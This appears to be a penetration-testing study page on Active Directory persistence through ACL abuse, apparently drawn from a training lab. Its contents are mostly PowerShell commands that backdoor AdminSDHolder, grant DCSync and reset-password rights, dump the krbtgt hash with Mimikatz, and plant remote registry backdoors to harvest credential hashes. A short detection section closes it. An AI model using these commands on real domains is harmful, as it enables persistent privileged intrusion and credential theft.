---
title: "ACL Persistence"
description: "Persistence using ACLs."
lead: "Using ACLs for persistence in Active Directory, such as AdminSDHolder, Protected Groups, Security Descriptors, and different ACL rights."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_persistence"
weight: 30
toc: true
---

## AdminSDHolder

### General

- Resides in the System container of a domain
- Used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups)
- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of `AdminSDHolder`
- Any differences are overwritten on the object ACL
- Protected groups
  - Domain Admins
  - Enterprise Admins
  - Domain Controllers
  - Read-only Domain Controllers
  - Schema Admins
  - Administrators
  - Account Operators
  - Backup Operators
  - Server Operators
  - Print Operators
  - Replicator

#### Protected Groups Abuse (All of the below can log on locally to DC)

| Group | Permissions |
| --- | --- |
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups. |
| Backup Operators | Backup GPO, edit to add SID of controlled account to a privileged group and Restore |
| Server Operators | Run a command as system (using the disabled Browser service) |
| Print Operators | Copy `ntds.dit` backup, load device drivers |

### Exploitation

- With DA privileges (Full Control/Write permissions) on the `AdminSDHolder` object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the `AdminSDHolder` object
- In 60 minutes (when `SDPROP` runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it

```powershell
# Add FullControl permission for a user to the AdminSDHolder using PowerView as DA
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student572 -Rights All -Verbose

# Using AD Module and Set-ADACL
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -Verbose

# Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student572 -Rights ResetPassword -Verbose
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student572 -Rights WriteMembers -Verbose

# Run SDProp manually using Invoke-SDPropagator.ps1 to apply permissions immediately
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# For Server 2008 and older
Invoke-SDPropagator -taskName FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose

# Check the Domain Admins permission as normal user
# With PowerView
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{ $_.IdentityReference -match 'student572' }

# Using AD Module
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{ $_.IdentityReference -match 'student572' }
```

#### Abusing FullControl Rights

```powershell
# Using PowerView_dev
Add-DomainGroupMember -Identity "Domain Admins" -Members testda -Verbose

# Using AD Module
Add-ADGroupMember -Identity "Domain Admins" -Members testda
```

#### Abusing ResetPassword Rights

```powershell
# Using PowerView_dev
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

# Using AD Module
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

## Rights Abuse

### General

- Add useful rights to domain user
- With DA privileges we can modify the ACL for the domain root to provide
  - FullControl
  - Ability to run DCSync

### Exploitation

#### FullControl Rights

```powershell
# Using PowerView
Add-Object -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights "All" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -Verbose

# Add new Domain Admin
# Using PowerView_dev
Add-DomainGroupMember -Identity "Domain Admins" -Members testda -Verbose

# Using AD Module
Add-ADGroupMember -Identity "Domain Admins" -Members testda
```

#### DCSync Rights

```powershell
# Confirm if user already has DCSync rights with PowerView
Get-ObjectAcl -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | ?{ ($_.IdentityReference -match "student572") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match "GenericAll")) }

# Using PowerView
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName "student572" -Rights "DCSync" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight "DCSync" -Verbose

# Execute DCSync to dump hash for krbtgt account
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

#### ResetPassword Rights

```powershell
# Using PowerView
Add-ObjectAcl -TargetADSprefix 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights "ResetPassword" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight "ResetPassword" -Verbose

# Reset password for account
# Using PowerView_dev
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

# Using AD Module
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

#### WriteMembers Rights

```powershell
# Using PowerView
Add-ObjectAcl -TargetADSprefix 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights "WriteMembers" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight "WriteMembers" -Verbose
```

## Security Descriptors

### General

- It's possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (secureable objects to allow access to non-admin users)
- Admin privileges required
- Security Description Definition Language defines format for Security Descriptors
- SDDL uses ACE strings for DACL and SACL

```powershell
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
```

- ACE for built-in administrators for WMI namespaces

```powershell
A;CI;CCDCLCSWRPWPRCWD;;;SID
```

### Exploitation

Using samratashok's [RACE.ps1](https://github.com/samratashok/RACE)

#### WMI

Modify ACLs to allow non-admin users access to securable objects

```powershell
# On local machine for user
Set-RemoteWMI -SamAccountName student572 -Verbose

# On remote machine for user without explicit credentials
Set-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Namespace "root\cimv2" -Verbose

# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces
Set-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Credential Administrator -Namespace "root\cimv2" -Verbose

# Remove permission on remote machine
Set-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Namespace "root\cimv2" -Remove -Verbose
```

#### PowerShell Remoting

Enable PS Remoting

```powershell
# On local machine
Set-RemotePSRemoting -SamAccountName student572 -Verbose

# On remote machine without credentials
Set-RemotePSRemoting -SamAccountName student572 -ComputerName dcorp-dc -Verbose

# Remove permission on remote machine
Set-RemotePSRemoting -SamAccountName student572 -ComputerName dcorp-dc -Remove -Verbose
```

#### Remote Registry

Remote registry changes and backdoors

```powershell
# With admin privs on remote machine, create backdoor
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student572 -Verbose

# As student572, retrieve machine account hash
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve local account hash
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve domain cached credentials
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

## Detection

- Events (Audit Policy for object must be enabled)
  - 4662: An operation was performed on an object
  - 5136: A directory service object was modified
  - 4670: Permissions on an object were changed
- Useful tools:
  - Bloodhound
  - [AD ACL Scanner](https://github.com/canix1/ADACLScanner) - Create and compare reports of ACLs
